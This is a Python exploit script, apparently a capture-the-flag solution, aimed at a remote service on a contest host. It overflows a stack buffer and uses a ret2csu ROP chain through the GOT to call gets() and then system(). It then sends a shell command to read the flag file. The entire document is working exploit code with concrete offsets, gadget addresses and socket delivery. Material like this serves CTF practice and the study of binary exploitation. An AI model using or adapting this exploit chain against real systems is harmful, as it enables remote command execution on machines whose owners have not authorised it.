import socket, struct

HOST = "gzcli.techcomfest.1pc.tf"
PORT = 32045

p64 = lambda x: struct.pack("<Q", x)

OFFSET = 72
RET = 0x400506

CSU_POP  = 0x40073a
CSU_CALL = 0x400720

GOT_SYSTEM = 0x601018
GOT_GETS   = 0x601028

# Nice tiny writable spot that is already "done" being used (init_array)
BUF = 0x600e10

def csu_call(func_got, rdi, rsi=0, rdx=0):
    # Sets up registers then executes the CSU "call [r12+rbx*8]" gadget once.
    chain  = p64(CSU_POP)
    chain += p64(0)          # rbx
    chain += p64(1)          # rbp (loop count)
    chain += p64(func_got)   # r12 = function pointer table base (GOT entry)
    chain += p64(rdi)        # r13 -> edi
    chain += p64(rsi)        # r14 -> rsi
    chain += p64(rdx)        # r15 -> rdx
    chain += p64(CSU_CALL)
    chain += p64(0xdeadbeefdeadbeef)  # consumed by "add rsp, 8"
    chain += p64(0)*6        # pops: rbx, rbp, r12, r13, r14, r15
    return chain

payload  = b"A" * OFFSET
payload += p64(RET)  # alignment
payload += csu_call(GOT_GETS, BUF)      # gets(BUF)
payload += csu_call(GOT_SYSTEM, BUF)    # system(BUF)
payload += b"\n"

s = socket.create_connection((HOST, PORT))

# read prompt
try:
    s.settimeout(1.0)
    print(s.recv(4096).decode(errors="ignore"), end="")
except Exception:
    pass

# stage 1: send rop
s.sendall(payload)

# stage 2: send command for gets()
s.sendall(b"cat flag*\n")

# print everything we get
s.settimeout(2.0)
out = b""
while True:
    try:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
    except Exception:
        break

print(out.decode(errors="ignore"))
s.close()
